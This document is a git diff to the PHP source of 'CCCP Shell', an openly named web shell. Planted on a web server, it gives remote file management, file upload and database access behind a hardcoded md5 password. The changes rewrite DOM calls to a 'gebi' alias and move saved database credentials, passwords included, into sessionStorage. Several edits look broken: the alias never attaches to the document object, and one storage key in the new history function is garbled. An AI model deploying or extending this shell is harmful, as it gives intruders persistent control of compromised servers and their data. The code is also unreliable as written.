@@ -1,9 +1,9 @@
 <?php
 /*
- *	CCCP Shell
- *	by DSR!
- *	https://github.com/xchwarze/CCCPShell
- *  v 1.0 RC3 16072014
+ * CCCP Shell
+ * by DSR!
+ * https://github.com/xchwarze/CCCPShell
+ * v 1.0 RC3 30072014
  */
 
 # System variables
@@ -13,9 +13,9 @@ $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16;   //lines in hex preview file
 $config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
 $config['FMLimit'] = False; //file manager item limit. False = No limit
-$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
 $config['checkBDel'] = true;//Check Before Delete: True = On
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
+$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
 
 $CCCPmod[] = 'sql';
 $CCCPtitle[] = tText('sql', 'SQL');
@@ -654,6 +654,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	var h = 0;
 	var j = 1;
 	var d = document;
+	var gebi = getElementById;
 	var euc = encodeURIComponent;
 	var onDrag = false;
 	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
@@ -662,9 +663,9 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	
 	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
 	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
-	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
-	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
-	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
+	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.gebi("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
+	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.gebi("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
+	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.gebi("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.gebi("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
 	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
 	sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
 	a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=
@@ -675,22 +676,22 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};
 
 	function append(e, c){
-		o = d.getElementById(e);
+		o = d.gebi(e);
 		if (o) o.innerHTML += c;
 	}
 	
 	function prepend(e, c){
-		o = d.getElementById(e);
+		o = d.gebi(e);
 		if (o) o.innerHTML = c + o.innerHTML;
 	}
 
 	function remove(e){
-		o = d.getElementById(e);
+		o = d.gebi(e);
 		if (o) o.parentNode.removeChild(o);
 	}
 
 	function empty(e){
-		o = d.getElementById(e);
+		o = d.gebi(e);
 		if (o) o.innerHTML = null;
 	}
 	
@@ -784,7 +785,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 
 	function dpath(e, t){
 		if (t)
-			return d.getElementById("base").value + e.parentNode.parentNode.getAttribute("data-path");
+			return d.gebi("base").value + e.parentNode.parentNode.getAttribute("data-path");
 		else
 			return e.parentNode.parentNode.getAttribute("data-path");
 	}
@@ -808,7 +809,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			y = dragY - dragDeltaY;
 			if (x < 0) x = 0;
 			if (y < 0) y = 0;
-			o = d.getElementById("box").style;
+			o = d.gebi("box").style;
 			o.left = x + "px";
 			o.top = y + "px";
 			setTimeout("drag_loop()", 50);
@@ -825,13 +826,13 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		box = "<div id=\'box\' class=\'box\'><p id=\'boxtitle\' class=\'boxtitle\'>"+t+"<span onclick=\'hide_box();\' class=\'boxclose floatRight\'>x</span></p><div class=\'boxcontent\'>"+ct+"</div></div>";
 		append("content", box);
 
-		x = (d.body.clientWidth - d.getElementById("box").clientWidth)/2;
-		y = (d.body.clientHeight - d.getElementById("box").clientHeight)/2;
+		x = (d.body.clientWidth - d.gebi("box").clientWidth)/2;
+		y = (d.body.clientHeight - d.gebi("box").clientHeight)/2;
 		if (x < 0) x = 0;
 		if (y < 0) y = 0;
 		dragX = x;
 		dragY = y;
-		o = d.getElementById("box").style;
+		o = d.gebi("box").style;
 		o.left = x + "px";
 		o.top = y + "px";
 			
@@ -839,7 +840,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			if (e.keyCode === 27) hide_box();
 		});
 		
-		d.getElementById("boxtitle").addEventListener("click", function(e){
+		d.gebi("boxtitle").addEventListener("click", function(e){
 			e.preventDefault();
 			if (!onDrag){		
 				dragDeltaX = e.pageX - parseInt(o.left);
@@ -870,12 +871,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function updateui(){
-		o = d.getElementById("jseval");
+		o = d.gebi("jseval");
 		if (o) eval(o.value);
-		o = d.getElementById("sort");
+		o = d.gebi("sort");
 		if (o) sorttable.k(o);
-		o = d.getElementById("etime");
-		if (o) d.getElementById("uetime").innerHTML = o.value;
+		o = d.gebi("etime");
+		if (o) d.gebi("uetime").innerHTML = o.value;
 	}
 	
 	function viewSize(f){
@@ -894,7 +895,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function godirui(){
-		ajaxLoad("me=file&dir=" + euc(d.getElementById("goui").value));
+		ajaxLoad("me=file&dir=" + euc(d.gebi("goui").value));
 	}
 	
 	function showUI(a, o){
@@ -919,12 +920,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			text = title;
 		} else if ((a === "cdir") || (a === "cfile")){
 			path = "";
-			datapath = d.getElementById("base").value;
+			datapath = d.gebi("base").value;
 			title = "' . tText('createdir', 'Create directory') . '";
 			if (a === "cfile") title = "' . tText('createfile', 'Create file') . '";
 		}
 	
-		ct = "<table class=\'boxtbl\'><tr><td class=\'colFit\'>" + text + "</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'" + path + "\' " + disabled + "></td></tr><tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr></table>";
+		ct = "<table class=\'boxtbl\'><tr><td class=\'colFit\'>" + text + "</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'" + path + "\' " + disabled + "></td></tr><tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.gebi(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr></table>";
 		show_box(title, ct);
 	}	
 	
@@ -940,12 +941,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		} else if (a === "copy"){
 			title = "' . tText('copy', 'Copy') . '";
 			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'\'></td></tr>";
-			n = "d.getElementById(&quot;uival&quot;).value";
+			n = "d.gebi(&quot;uival&quot;).value";
 		} else if (a === "rdel"){
 			title = "' . tText('del', 'Del') . '";
 		}
 
-		ct = "<table class=\'boxtbl\'>" + uival + "<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.getElementById("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr></table>";
+		ct = "<table class=\'boxtbl\'>" + uival + "<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.gebi("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr></table>";
 		if (a === "comp" && s.length > 2000) ct += "<div class=\'boxresult\'>WARNING the GET request is > 2000 chars</div>";
 		show_box(title, ct);
 	}
@@ -957,7 +958,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		} else {
 			if (a !== "rdel" && n === "") return;
 			if (a !== "copy" && a !== "rdel") o = euc(o);
-			if (a === "ren") n = d.getElementById("base").value + n;
+			if (a === "ren") n = d.gebi("base").value + n;
 			ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
 				if (r === "OK"){
 					hide_box();
@@ -973,7 +974,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function up(){
-		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getCrypt("me=file&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
+		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getCrypt("me=file&ac=up&dir=" + euc(d.gebi("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
 		show_box("' . tText('upload', 'Upload') . '", ct);
 	}
 	
@@ -995,24 +996,45 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}	
 	
 	function dbengine(t){
-		d.getElementById("su").className = "hide";
-		d.getElementById("sp").className = "hide";
-		d.getElementById("so").className = "hide";
+		d.gebi("su").className = "hide";
+		d.gebi("sp").className = "hide";
+		d.gebi("so").className = "hide";
 		
 		if ((t.value === "odbc") || (t.value === "pdo")){
-			d.getElementById("sh").innerHTML = "' . tText('sq5', 'DSN/Connection String') . '";
-			d.getElementById("su").className = "";
-			d.getElementById("sp").className = "";
+			d.gebi("sh").innerHTML = "' . tText('sq5', 'DSN/Connection String') . '";
+			d.gebi("su").className = "";
+			d.gebi("sp").className = "";
 		} else if ((t.value === "sqlite") || (t.value === "sqlite3")){
-			d.getElementById("sh").innerHTML = "' . tText('sq6', 'DB File') . '";
+			d.gebi("sh").innerHTML = "' . tText('sq6', 'DB File') . '";
 		} else {
-			d.getElementById("sh").innerHTML = "' . tText('sq7', 'Host') . '";
-			d.getElementById("su").className = "";
-			d.getElementById("sp").className = "";
-			d.getElementById("so").className = "";
+			d.gebi("sh").innerHTML = "' . tText('sq7', 'Host') . '";
+			d.gebi("su").className = "";
+			d.gebi("sp").className = "";
+			d.gebi("so").className = "";
 		}
 	}
 	
+	function dbhistory(a){
+		if (a == "s"){
+			o = {history: []};
+			if (sessionStorage.getItem("'{$config['consNames']['sqlclog']}'") != null)
+				o = JSON.parse(sessionStorage.getItem("'{$config['consNames']['sqlclog']}'"));
+				
+			o.history.push({"sqltype": d.gebi("sqltype").value, "sqlhost": d.gebi("sqlhost").value, 
+				"sqlport": d.gebi("sqlport").value, "sqluser": d.gebi("sqluser").value, "sqlpass": d.gebi("sqlpass").value});
+			sessionStorage.setItem("'{$config['consNames']['sqlclog']}'", JSON.stringify(o));
+		} else if (sessionStorage.getItem("'{$config['consNames'][''{$config['consNames']['sqlclog']}'']}'") != null) {
+			s = "";
+			o = JSON.parse(sessionStorage.getItem("'{$config['consNames']['sqlclog']}'"));
+			for (i = 0; i < o.history.length; i++){
+				u = "me=sql&sqlhost=" + o.history[i].sqlhost + "&sqlport=" + o.history[i].sqlport + "&sqluser=" + o.history[i].sqluser + "&sqlpass=" + o.history[i].sqlpass + "&sqltype=" + o.history[i].sqltype;
+				s += "[" + o.history[i].sqltype.toUpperCase() + "] " + o.history[i].sqluser + "@" + o.history[i].sqlhost + "<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;" + u + "&quot;)\'>' . tText('go', 'Go!') . '</a></span><br>";
+			}
+			
+			if (s != "") prepend("content", "<div id=\'uires\' class=\'uires\'>" + s + "</div>");
+		}//TODO add delete a entry
+	}
+
 	function CheckAll(form){
 		for(i = 0; i < form.elements.length; i++){
 			e = form.elements[i];
@@ -1021,16 +1043,16 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 		
 	function toggle(b){
-		if (d.getElementById(b)){
-			if (d.getElementById(b).style.display == "block") d.getElementById(b).style.display = "none";
-			else d.getElementById(b).style.display = "block"
+		if (d.gebi(b)){
+			if (d.gebi(b).style.display == "block") d.gebi(b).style.display = "none";
+			else d.gebi(b).style.display = "block"
 		}
 	}
 	
 	function change(l, b){
-		d.getElementById(l).style.display = "none";
-		d.getElementById(b).style.display = "block";
-		if (d.getElementById("goui")) d.getElementById("goui").focus();
+		d.gebi(l).style.display = "none";
+		d.gebi(b).style.display = "block";
+		if (d.gebi("goui")) d.gebi("goui").focus();
 	}
 	
 	function hilite(e){
@@ -1041,7 +1063,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			c.className = "";
 		
 		a = d.getElementsByName("cbox");
-		b = d.getElementById("total_selected");
+		b = d.gebi("total_selected");
 		c = 0;
 		
 		for (i = 0;i<a.length;i++) 
@@ -2323,20 +2345,13 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 		sAjax($sBuff);
 	} elseif (isset($p['sqlhost'])){
 		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
-		if ($con !== false){
-			if(isset($p['sqlinit'])){
-				$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
-				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c']))
-					$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
-				setcookie('c[' . $c_num . ']', ((function_exists('json_encode') && function_exists('json_decode')) ? json_encode($p) : serialize($p)), time() + $config['cookieExp']);
-			}
-			
+		if ($con !== false){		
 			$sBuff .= '<form>' .
 				mHide('me', 'sql') . mHide('sqltype', $p['sqltype']) . 
 				mHide('sqlhost', $p['sqlhost']) . mHide('sqlport', $p['sqlport']) . 
 				mHide('sqluser', $p['sqluser']) . mHide('sqlpass', $p['sqlpass']) . '
 				</form><textarea id="sqlcode" name="sqlcode" class="bigarea" style="height: 100px;"></textarea>
-				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
+				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.gebi(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
 				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p>
 				<table class="border" style="padding:0;"><tbody>
 				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
@@ -2384,28 +2399,13 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 			$sBuff .= '</td>
 				<td id="dbRes" style="vertical-align:top;width:100%;"></td>
 				</tr></tbody></table>';
+			if (isset($p['sqlinit'])) 
+				$sBuff .= mHide('jseval', 'dbhistory("v");');
 			
 			sql_close($p['sqltype'], $con);
 		} else
 			$sBuff .= sDialog('Unable to connect to database');
 	} else {
-		if (isset($_COOKIE['c'])){
-			$delme = '';
-			if (isset($p['dc'])){
-				setcookie('c[' . $p['dc'] . ']', '', time() - 1337);
-				$delme = $p['dc'];
-			}
-	
-			foreach($_COOKIE['c'] as $c => $d){
-				if ($c == $delme) continue;
-				$sql = array();
-				foreach(((function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d)) as $k => $v) $sql[$k] = $v;
-				$sBuff .= sDialog('[' . strtoupper($sql['sqltype']) . '] ' . $sql['sqluser'] . '@' . $sql['sqlhost'] . '<span style="float:right;">' .
-					'<a href="#" onclick="ajaxLoad(\'me=sql&sqlhost=' . $sql['sqlhost'] . '&sqlport=' . $sql['sqlport'] . '&sqluser=' . $sql['sqluser'] . '&sqlpass=' . $sql['sqlpass'] . '&sqltype=' . $sql['sqltype'] . '\');">connect</a>' .
-					' | <a href="#" onclick="ajaxLoad(\'me=sql&dc=' . $c . '\')">disconnect</a></span>');
-			}
-		}
-		
 		$sqllist = array();
 		if (function_exists('mysql_connect') || function_exists('mysqli_connect')) $sqllist['mysql'] = 'MySQL [using mysql_* or mysqli_*]';
 		if (function_exists('mssql_connect') || function_exists('sqlsrv_connect')) $sqllist['mssql'] = 'MsSQL [using mssql_* or sqlsrv_*]';
@@ -2428,8 +2428,8 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 					'<span id="sp">' . mInput(array('n'=>'sqlpass', 'tt'=>tText('sq1', 'Password'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
 					'<span id="so">' . mInput(array('n'=>'sqlport', 'tt'=>tText('sq2', 'Port (optional)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '</span>' .
 					mSelect('sqltype', $sqllist, false, false, 'dbengine(this)', tText('sq3', 'Engine')) . 
-					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("sqltype"))') . 
-					'<center>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))', 1) . '</center>' .
+					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.gebi("sqltype"));dbhistory("v");') . 
+					'<center>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]));', 1) . '</center>' .
 					'</form></div>
 			</div>';
 	}
